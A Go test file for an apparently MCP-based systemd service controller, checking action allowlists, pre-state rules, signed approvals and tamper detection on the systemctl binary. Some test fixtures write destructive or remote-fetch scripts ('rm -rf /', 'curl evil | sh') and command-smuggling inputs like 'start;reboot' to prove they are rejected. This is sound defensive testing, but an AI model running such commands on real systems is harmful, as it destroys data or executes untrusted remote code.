package mcp

import (
	"context"
	"crypto/ed25519"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

func TestActionRegistryIsExactlyThreeActions(t *testing.T) {
	if len(serviceActionRegistry) != 3 {
		t.Fatalf("registry has %d actions, want exactly 3", len(serviceActionRegistry))
	}
	want := map[serviceAction]serviceActionSpec{
		actionStart: {
			action:          actionStart,
			verb:            "start",
			allowedPreState: "inactive",
			success: serviceActionSuccessSpec{
				activeState:       "active",
				subState:          "running",
				pid:               servicePIDPositive,
				transition:        serviceTransitionActiveEnter,
				invocationChanges: true,
			},
		},
		actionStop: {
			action:          actionStop,
			verb:            "stop",
			allowedPreState: "active",
			success: serviceActionSuccessSpec{
				activeState: "inactive",
				pid:         servicePIDZero,
				transition:  serviceTransitionInactiveEnter,
			},
		},
		actionRestart: {
			action:          actionRestart,
			verb:            "restart",
			allowedPreState: "active",
			success: serviceActionSuccessSpec{
				activeState:       "active",
				subState:          "running",
				pid:               servicePIDPositive,
				transition:        serviceTransitionActiveEnter,
				invocationChanges: true,
			},
		},
	}
	for action, expected := range want {
		spec, ok := serviceActionRegistry[action]
		if !ok {
			t.Fatalf("registry is missing %s", action)
		}
		if spec != expected {
			t.Errorf("registry spec for %s = %+v, want %+v", action, spec, expected)
		}
	}
}

func TestParseServiceActionIsTheOnlyEntryPoint(t *testing.T) {
	for _, raw := range []string{"start", " STOP ", "Restart", "\trestart\n"} {
		if _, err := parseServiceAction(raw); err != nil {
			t.Errorf("valid action %q was rejected: %v", raw, err)
		}
	}
	for _, raw := range []string{
		"", "reload", "kill", "enable", "disable", "mask", "daemon-reload",
		"start;reboot", "start reboot", "../start", "sTaRt extra",
	} {
		if _, err := parseServiceAction(raw); err == nil {
			t.Errorf("action %q was accepted", raw)
		}
	}
}

func TestAllowlistIsMandatoryAndBounded(t *testing.T) {
	if _, err := parseAllowedServiceActions(nil); err == nil {
		t.Error("a nil allowlist was accepted")
	}
	if _, err := parseAllowedServiceActions([]string{}); err == nil {
		t.Error("an empty allowlist was accepted")
	}
	if _, err := parseAllowedServiceActions([]string{"restart", "reload"}); err == nil {
		t.Error("an allowlist containing an unknown action was accepted")
	}

	allowed, err := parseAllowedServiceActions([]string{"restart", " STOP "})
	if err != nil {
		t.Fatalf("valid allowlist rejected: %v", err)
	}
	if !allowed[actionRestart] || !allowed[actionStop] {
		t.Errorf("allowlist did not admit its members: %v", allowed)
	}
	if allowed[actionStart] {
		t.Error("allowlist admitted an action it did not list")
	}
}

// Every action is permitted only from its explicit stable pre-state.
func TestActionPreStateMatrix(t *testing.T) {
	// want[action][state] = may this action run from this state?
	want := map[serviceAction]map[string]bool{
		actionStart: {
			"inactive": true, "active": false, "failed": false,
			"activating": false, "reloading": false, "deactivating": false,
		},
		actionStop: {
			"inactive": false, "active": true, "failed": false,
			"activating": false, "reloading": false, "deactivating": false,
		},
		actionRestart: {
			"inactive": false, "active": true, "failed": false,
			"activating": false, "reloading": false, "deactivating": false,
		},
	}

	for action, states := range want {
		spec := serviceActionRegistry[action]
		for state, permitted := range states {
			status := serviceStatus{LoadState: "loaded", ActiveState: state}
			err := validateActionPreState(spec, status)
			if permitted && err != nil {
				t.Errorf("%s from %s was refused: %v", action, state, err)
			}
			if !permitted && err == nil {
				t.Errorf("%s from %s was permitted", action, state)
			}
		}
	}
}

func TestUnloadedUnitBlocksEveryAction(t *testing.T) {
	states := []string{"active", "inactive", "failed", "activating", "reloading", "deactivating", "unknown", ""}
	for _, load := range []string{"not-found", "masked", "error", "bad-setting", ""} {
		for action, spec := range serviceActionRegistry {
			for _, state := range states {
				err := validateActionPreState(spec, serviceStatus{LoadState: load, ActiveState: state})
				if err == nil {
					t.Errorf("%s was permitted with load_state=%q", action, load)
					continue
				}
				if !strings.Contains(err.Error(), "load_state="+load) {
					t.Errorf("error for load_state=%q = %q, want it to report the load state", load, err)
				}
			}
		}
	}
}

func TestUnknownActiveStateIsRefused(t *testing.T) {
	for _, state := range []string{"unknown", "", "maintenance"} {
		for action, spec := range serviceActionRegistry {
			if err := validateActionPreState(spec, serviceStatus{LoadState: "loaded", ActiveState: state}); err == nil {
				t.Errorf("%s was permitted from an unrecognised state %q", action, state)
			}
		}
	}
}

func TestTransitionalStatesAreAlwaysRefused(t *testing.T) {
	for _, state := range []string{"activating", "reloading", "deactivating"} {
		for action, spec := range serviceActionRegistry {
			err := validateActionPreState(spec, serviceStatus{LoadState: "loaded", ActiveState: state})
			if err == nil {
				t.Errorf("%s was permitted while the unit was %s", action, state)
				continue
			}
			if !strings.Contains(err.Error(), "transition") {
				t.Errorf("%s from %s: error %q does not explain the transition", action, state, err)
			}
		}
	}
}

func TestPendingJobIsRefused(t *testing.T) {
	for action, spec := range serviceActionRegistry {
		status := serviceStatus{LoadState: "loaded", ActiveState: "active", Job: "12345 restart"}
		if err := validateActionPreState(spec, status); err == nil {
			t.Errorf("%s was permitted with a pending systemd job", action)
		}
	}
	// An empty or whitespace Job is not a pending job.
	spec := serviceActionRegistry[actionStop]
	for _, job := range []string{"", "   "} {
		status := serviceStatus{LoadState: "loaded", ActiveState: "active", Job: job}
		if err := validateActionPreState(spec, status); err != nil {
			t.Errorf("stop refused with Job=%q: %v", job, err)
		}
	}
}

func realTempDir(t *testing.T) string {
	t.Helper()
	return secureTempDir(t)
}

func writeExecutable(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatalf("writing %s: %v", path, err)
	}
	if err := os.Chmod(path, 0o755); err != nil {
		t.Fatalf("setting executable mode on %s: %v", path, err)
	}
}

func TestResolveExecutableRejectsUnsafePaths(t *testing.T) {
	dir := realTempDir(t)
	good := filepath.Join(dir, "systemctl")
	writeExecutable(t, good, "#!/bin/sh\n")

	if _, err := resolveTestExecutable(good); err != nil {
		t.Fatalf("a clean absolute regular file was rejected: %v", err)
	}

	t.Run("relative path", func(t *testing.T) {
		if _, err := resolveTestExecutable("bin/systemctl"); err == nil {
			t.Error("a relative path was accepted")
		}
	})

	t.Run("unclean path", func(t *testing.T) {
		// filepath.Join would clean this, so build the traversal literally.
		unclean := dir + "/./systemctl"
		if _, err := resolveTestExecutable(unclean); err == nil {
			t.Error("an unclean path was accepted")
		}
	})

	t.Run("empty path", func(t *testing.T) {
		if _, err := resolveTestExecutable(""); err == nil {
			t.Error("an empty path was accepted")
		}
	})

	t.Run("final component is a symlink", func(t *testing.T) {
		link := filepath.Join(dir, "systemctl-link")
		if err := os.Symlink(good, link); err != nil {
			t.Fatalf("symlink: %v", err)
		}
		if _, err := resolveTestExecutable(link); err == nil {
			t.Error("a symlinked executable was accepted")
		}
	})

	t.Run("parent directory is a symlink", func(t *testing.T) {
		realDir := filepath.Join(dir, "realbin")
		if err := os.Mkdir(realDir, 0o755); err != nil {
			t.Fatalf("mkdir: %v", err)
		}
		target := filepath.Join(realDir, "systemctl")
		writeExecutable(t, target, "#!/bin/sh\n")
		linkDir := filepath.Join(dir, "linkbin")
		if err := os.Symlink(realDir, linkDir); err != nil {
			t.Fatalf("symlink: %v", err)
		}
		if _, err := resolveTestExecutable(filepath.Join(linkDir, "systemctl")); err == nil {
			t.Error("a path traversing a symlinked directory was accepted")
		}
	})

	t.Run("not a regular file", func(t *testing.T) {
		if _, err := resolveTestExecutable(dir); err == nil {
			t.Error("a directory was accepted as an executable")
		}

		// A fifo is the case that must be rejected on its type rather than by
		// failing later: opening one to hash it blocks until a writer appears,
		// which would hang startup instead of refusing it.
		fifo := filepath.Join(dir, "fifo")
		if err := syscall.Mkfifo(fifo, 0o700); err != nil {
			t.Skipf("mkfifo unavailable: %v", err)
		}
		done := make(chan error, 1)
		go func() {
			_, err := resolveTestExecutable(fifo)
			done <- err
		}()
		select {
		case err := <-done:
			if err == nil {
				t.Error("a fifo was accepted as an executable")
			}
		case <-time.After(2 * time.Second):
			t.Fatal("resolveExecutable blocked on a fifo instead of rejecting it")
		}
	})

	t.Run("missing file", func(t *testing.T) {
		if _, err := resolveTestExecutable(filepath.Join(dir, "absent")); err == nil {
			t.Error("a missing path was accepted")
		}
	})

	t.Run("group or world writable executable", func(t *testing.T) {
		for _, perm := range []os.FileMode{0o757, 0o775} {
			writable := filepath.Join(dir, "writable")
			writeExecutable(t, writable, "#!/bin/sh\n")
			if err := os.Chmod(writable, perm); err != nil {
				t.Fatalf("chmod: %v", err)
			}
			if _, err := resolveTestExecutable(writable); err == nil {
				t.Errorf("a %v executable was accepted", perm)
			}
			os.Remove(writable)
		}
	})

	t.Run("group or world writable parent", func(t *testing.T) {
		for _, perm := range []os.FileMode{0o777, 0o775} {
			loose := filepath.Join(dir, "loose")
			if err := os.Mkdir(loose, 0o755); err != nil {
				t.Fatalf("mkdir: %v", err)
			}
			target := filepath.Join(loose, "systemctl")
			writeExecutable(t, target, "#!/bin/sh\n")
			if err := os.Chmod(loose, perm); err != nil {
				t.Fatalf("chmod: %v", err)
			}
			if _, err := resolveTestExecutable(target); err == nil {
				t.Errorf("an executable under a %v directory was accepted", perm)
			}
			os.Chmod(loose, 0o755)
			os.RemoveAll(loose)
		}
	})
}

func TestFileDigestRejectsSymlink(t *testing.T) {
	dir := realTempDir(t)
	target := filepath.Join(dir, "systemctl")
	writeExecutable(t, target, "#!/bin/sh\nexit 0\n")
	link := filepath.Join(dir, "systemctl-link")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	if _, err := fileDigest(link); err == nil {
		t.Fatal("file digest followed a symlink")
	}
}

func TestExecutableOwnerPolicyRequiresRootInProduction(t *testing.T) {
	if !executableOwnerAllowed(0, 0) {
		t.Fatal("root-owned path was rejected")
	}
	if executableOwnerAllowed(1000, 0) {
		t.Fatal("non-root-owned path passed the production policy")
	}
	if !executableOwnerAllowed(1000, 1000) {
		t.Fatal("the unprivileged test policy cannot admit its fixture owner")
	}
	if executableOwnerAllowed(1001, 1000) {
		t.Fatal("the test policy admitted an unrelated owner")
	}

	if os.Getuid() == 0 {
		return
	}
	dir := realTempDir(t)
	path := filepath.Join(dir, "systemctl")
	writeExecutable(t, path, "#!/bin/sh\n")
	if _, err := resolveExecutable(path); err == nil || !strings.Contains(err.Error(), "root-owned") {
		t.Fatalf("production resolver accepted a user-owned path: %v", err)
	}
}

func TestVerifyUnchangedDetectsReplacement(t *testing.T) {
	setup := func(t *testing.T) (string, executableIdentity) {
		t.Helper()
		dir := realTempDir(t)
		path := filepath.Join(dir, "systemctl")
		writeExecutable(t, path, "#!/bin/sh\nexit 0\n")
		id, err := resolveTestExecutable(path)
		if err != nil {
			t.Fatalf("startup check failed: %v", err)
		}
		if err := id.verifyUnchanged(); err != nil {
			t.Fatalf("an untouched executable failed re-verification: %v", err)
		}
		return path, id
	}

	t.Run("contents rewritten in place", func(t *testing.T) {
		path, id := setup(t)
		// Truncate-and-rewrite keeps the inode, so only the digest changes.
		writeExecutable(t, path, "#!/bin/sh\nrm -rf /\n")
		err := id.verifyUnchanged()
		if err == nil {
			t.Fatal("a rewritten executable passed verification")
		}
		if !strings.Contains(err.Error(), "contents") {
			t.Errorf("error %q does not name the contents change", err)
		}
	})

	t.Run("replaced by rename", func(t *testing.T) {
		path, id := setup(t)
		// The atomic swap an installer or attacker would use: new inode,
		// and the digest may even be identical.
		replacement := path + ".new"
		writeExecutable(t, replacement, "#!/bin/sh\nexit 0\n")
		if err := os.Rename(replacement, path); err != nil {
			t.Fatalf("rename: %v", err)
		}
		err := id.verifyUnchanged()
		if err == nil {
			t.Fatal("a rename-replaced executable passed verification")
		}
		if !strings.Contains(err.Error(), "inode") {
			t.Errorf("error %q does not name the inode change", err)
		}
	})

	t.Run("mode changed", func(t *testing.T) {
		path, id := setup(t)
		if err := os.Chmod(path, 0o700); err != nil {
			t.Fatalf("chmod: %v", err)
		}
		err := id.verifyUnchanged()
		if err == nil {
			t.Fatal("a mode change passed verification")
		}
		if !strings.Contains(err.Error(), "mode") {
			t.Errorf("error %q does not name the mode change", err)
		}
	})

	t.Run("owner changed", func(t *testing.T) {
		// chown requires privileges the test does not have, so the recorded
		// uid is perturbed instead; the comparison under test is the same.
		path, id := setup(t)
		_ = path
		id.uid++
		err := id.verifyUnchanged()
		if err == nil {
			t.Fatal("an owner change passed verification")
		}
		if !strings.Contains(err.Error(), "owner") {
			t.Errorf("error %q does not name the owner change", err)
		}
	})

	t.Run("device changed", func(t *testing.T) {
		// Likewise for a cross-device swap, which cannot be staged here.
		_, id := setup(t)
		id.device++
		err := id.verifyUnchanged()
		if err == nil {
			t.Fatal("a device change passed verification")
		}
		if !strings.Contains(err.Error(), "device") {
			t.Errorf("error %q does not name the device change", err)
		}
	})

	t.Run("replaced by a symlink", func(t *testing.T) {
		path, id := setup(t)
		elsewhere := filepath.Join(filepath.Dir(path), "elsewhere")
		writeExecutable(t, elsewhere, "#!/bin/sh\n")
		if err := os.Remove(path); err != nil {
			t.Fatalf("remove: %v", err)
		}
		if err := os.Symlink(elsewhere, path); err != nil {
			t.Fatalf("symlink: %v", err)
		}
		if err := id.verifyUnchanged(); err == nil {
			t.Fatal("an executable replaced by a symlink passed verification")
		}
	})

	t.Run("deleted", func(t *testing.T) {
		path, id := setup(t)
		if err := os.Remove(path); err != nil {
			t.Fatalf("remove: %v", err)
		}
		if err := id.verifyUnchanged(); err == nil {
			t.Fatal("a deleted executable passed verification")
		}
	})
}

// operatorFixtureConfig builds a config that passes every operator check
// except the one a subtest deliberately breaks.
func operatorFixtureConfig(t *testing.T) Config {
	t.Helper()
	dir := realTempDir(t)
	systemctl := filepath.Join(dir, "systemctl")
	if err := os.WriteFile(systemctl, []byte("binary"), 0o700); err != nil {
		t.Fatal(err)
	}
	return Config{
		Profile:               ProfileOperator,
		ControlEnabled:        true,
		SystemdUnit:           "mithril.service",
		SystemdScope:          "system",
		SystemctlPath:         systemctl,
		ApproverKeysDir:       writeTestApproverDirectory(t, dir),
		ControlTargetID:       "test-node",
		ApprovalTTLSeconds:    60,
		ControlStateDir:       filepath.Join(dir, "control"),
		AuditClientConfigPath: filepath.Join(dir, "audit-client.json"),
		AllowedServiceActions: []string{"restart"},
	}
}

func TestOperatorStartupRequiresAnAllowlist(t *testing.T) {
	base := operatorFixtureConfig(t)
	if _, err := validateTestOperatorConfig(base); err != nil {
		t.Fatalf("a config with an allowlist was rejected: %v", err)
	}

	for name, allowlist := range map[string][]string{
		"nil":     nil,
		"empty":   {},
		"blank":   {"   "},
		"unknown": {"restart", "reload"},
	} {
		t.Run(name, func(t *testing.T) {
			cfg := base
			cfg.AllowedServiceActions = allowlist
			if _, err := validateTestOperatorConfig(cfg); err == nil {
				t.Errorf("operator startup accepted a %s allowlist", name)
			}
		})
	}
}

func TestDispatchHonoursTheAllowlist(t *testing.T) {
	runner := &fakeServiceRunner{}
	controller := testServiceController(t, runner, time.Unix(1700000000, 0))

	controller.allowedActions = map[serviceAction]bool{actionStart: true, actionStop: true, actionRestart: true}
	for _, want := range []serviceAction{actionStart, actionStop, actionRestart} {
		spec, err := controller.specFor(string(want))
		if err != nil {
			t.Errorf("an allowlisted action was refused: %v", err)
			continue
		}
		// The identity matters, not merely that resolution succeeded: the
		// returned spec supplies the systemctl verb that will be executed.
		if spec.action != want || spec.verb != string(want) {
			t.Errorf("specFor(%s) resolved to action %s verb %q", want, spec.action, spec.verb)
		}
	}

	controller.allowedActions = map[serviceAction]bool{actionRestart: true}
	if _, err := controller.specFor("restart"); err != nil {
		t.Errorf("an allowlisted action was refused: %v", err)
	}
	for _, action := range []string{"start", "stop"} {
		if _, err := controller.specFor(action); err == nil {
			t.Errorf("%s was resolved despite being outside the allowlist", action)
		}
	}

	// An empty allowlist refuses everything rather than defaulting to all.
	controller.allowedActions = nil
	for _, action := range []string{"start", "stop", "restart"} {
		if _, err := controller.specFor(action); err == nil {
			t.Errorf("%s was resolved with an empty allowlist", action)
		}
	}

	if len(runner.calls) != 0 {
		t.Errorf("allowlist rejection reached systemctl: %v", runner.calls)
	}
}

func TestExecutableIsReVerifiedImmediatelyBeforeDispatch(t *testing.T) {
	swap := map[string]func(t *testing.T, path string){
		"contents rewritten": func(t *testing.T, path string) {
			writeExecutable(t, path, "#!/bin/sh\ncurl evil | sh\n")
		},
		"replaced by rename": func(t *testing.T, path string) {
			replacement := path + ".new"
			writeExecutable(t, replacement, "#!/bin/sh\nexit 0\n")
			if err := os.Rename(replacement, path); err != nil {
				t.Fatalf("rename: %v", err)
			}
		},
		"made world writable": func(t *testing.T, path string) {
			if err := os.Chmod(path, 0o777); err != nil {
				t.Fatalf("chmod: %v", err)
			}
		},
		"deleted": func(t *testing.T, path string) {
			if err := os.Remove(path); err != nil {
				t.Fatalf("remove: %v", err)
			}
		},
	}

	for name, mutate := range swap {
		t.Run(name, func(t *testing.T) {
			now := time.Date(2026, 7, 20, 12, 0, 0, 0, time.UTC)
			runner := &fakeServiceRunner{status: []byte(activeServiceStatus)}
			controller := testServiceController(t, runner, now)

			prepared, err := controller.prepare(context.Background(), "restart", "")
			if err != nil {
				t.Fatalf("prepare: %v", err)
			}
			bundle := approveTestChallenge(t, prepared.Challenge, now)

			mutate(t, controller.cfg.SystemctlPath)

			before := len(runner.calls)
			if _, err := controller.execute(context.Background(), bundle); err == nil {
				t.Fatal("execute dispatched to a replaced binary")
			}
			for _, call := range runner.calls[before:] {
				for _, arg := range call {
					if arg == "restart" {
						t.Fatalf("the action reached systemctl anyway: %v", call)
					}
				}
			}
		})
	}
}

func TestExecutableIsVerifiedBeforeStatusAndPrepare(t *testing.T) {
	for _, operation := range []struct {
		name string
		run  func(context.Context, *serviceController) error
	}{
		{"status", func(ctx context.Context, c *serviceController) error {
			_, err := c.status(ctx)
			return err
		}},
		{"prepare", func(ctx context.Context, c *serviceController) error {
			_, err := c.prepare(ctx, "restart", "")
			return err
		}},
	} {
		t.Run(operation.name, func(t *testing.T) {
			runner := &fakeServiceRunner{status: []byte(activeServiceStatus)}
			controller := testServiceController(t, runner, time.Unix(1700000000, 0))
			writeExecutable(t, controller.cfg.SystemctlPath, "#!/bin/sh\nexit 99\n")

			if err := operation.run(context.Background(), controller); err == nil {
				t.Fatal("operation used a replaced systemctl executable")
			}
			if len(runner.calls) != 0 {
				t.Fatalf("replacement reached the runner: %v", runner.calls)
			}
		})
	}
}

func TestDispatchRefusesWithoutAnExecutableIdentity(t *testing.T) {
	now := time.Date(2026, 7, 20, 12, 0, 0, 0, time.UTC)
	runner := &fakeServiceRunner{status: []byte(activeServiceStatus)}
	controller := testServiceController(t, runner, now)

	prepared, err := controller.prepare(context.Background(), "restart", "")
	if err != nil {
		t.Fatalf("prepare: %v", err)
	}
	bundle := approveTestChallenge(t, prepared.Challenge, now)

	controller.executable = nil
	controller.executableErr = errors.New("systemctl path must not traverse a symlink")

	_, err = controller.execute(context.Background(), bundle)
	if err == nil {
		t.Fatal("execute dispatched with no recorded executable identity")
	}
	if !strings.Contains(err.Error(), "symlink") {
		t.Errorf("error %q does not report why identity resolution failed", err)
	}
}

func TestUnresolvableSystemctlLeavesNoIdentity(t *testing.T) {
	dir := realTempDir(t)
	runner := &fakeServiceRunner{status: []byte(activeServiceStatus)}
	controller := newServiceController(Config{
		Profile:               ProfileOperator,
		SystemdUnit:           "mithril.service",
		SystemdScope:          "system",
		SystemctlPath:         filepath.Join(dir, "absent"),
		AllowedServiceActions: []string{"restart"},
	}, testApprovalAuthority())
	controller.runner = runner

	if controller.executable != nil {
		t.Fatal("an unresolvable path produced an executable identity")
	}
	if controller.executableErr == nil {
		t.Fatal("the resolution failure was discarded")
	}
	if _, err := controller.status(context.Background()); err == nil {
		t.Fatal("status ran without an executable identity")
	}
	if len(runner.calls) != 0 {
		t.Fatalf("status reached the runner without an identity: %v", runner.calls)
	}
}

func TestApprovalRejectsChallengeCarryingAnUnknownAction(t *testing.T) {
	now := time.Date(2026, 7, 20, 12, 0, 0, 0, time.UTC)
	privateKey := testApproverPrivateKey()
	keyID := approverKeyID(privateKey.Public().(ed25519.PublicKey))
	status, err := parseServiceStatus("mithril.service", "system", []byte(activeServiceStatus))
	if err != nil {
		t.Fatal(err)
	}
	var nonce [approvalNonceBytes]byte
	nonce[0] = 1

	claims := approvalClaims{
		Version:       approvalVersion,
		Domain:        serviceApprovalDomain,
		ServerSession: "session",
		TargetID:      "target",
		ActionID:      "action-id",
		Unit:          "mithril.service",
		Scope:         "system",
		BeforeHash:    serviceStateHash(status),
		Nonce:         nonce,
		IssuedAtUnix:  now.Unix(),
		ExpiresAtUnix: now.Add(time.Minute).Unix(),
		ApproverKeyID: keyID,
	}

	valid := claims
	valid.Action = actionRestart
	challenge, err := encodeApprovalChallenge(valid, status)
	if err != nil {
		t.Fatalf("encoding a valid challenge: %v", err)
	}
	if _, err := ApproveServiceChallenge(challenge, privateKey, now); err != nil {
		t.Fatalf("a valid challenge was rejected: %v", err)
	}

	for _, action := range []string{"reload", "kill", "mask", "", "restart;reboot"} {
		forged := claims
		forged.Action = serviceAction(action)
		token, err := encodeApprovalChallenge(forged, status)
		if err != nil {
			t.Fatalf("encoding a challenge for %q: %v", action, err)
		}
		if _, err := ApproveServiceChallenge(token, privateKey, now); err == nil {
			t.Errorf("a signed challenge carrying action %q was approved", action)
		}
	}
}

func TestDescribeAllowedActionsMatchesDispatch(t *testing.T) {
	cases := []struct {
		allowed map[serviceAction]bool
		want    string
	}{
		{map[serviceAction]bool{actionRestart: true}, "restart"},
		{map[serviceAction]bool{actionStart: true, actionStop: true}, "start or stop"},
		{map[serviceAction]bool{actionStart: true, actionStop: true, actionRestart: true}, "start, stop or restart"},
	}
	for _, tc := range cases {
		if got := describeAllowedActions(tc.allowed); got != tc.want {
			t.Errorf("describeAllowedActions(%v) = %q, want %q", tc.allowed, got, tc.want)
		}
	}

	// An empty allowlist must not read as "all three".
	empty := describeAllowedActions(nil)
	for _, action := range []string{"start", "stop", "restart"} {
		if strings.Contains(empty, action) {
			t.Errorf("an empty allowlist advertised %s: %q", action, empty)
		}
	}

}
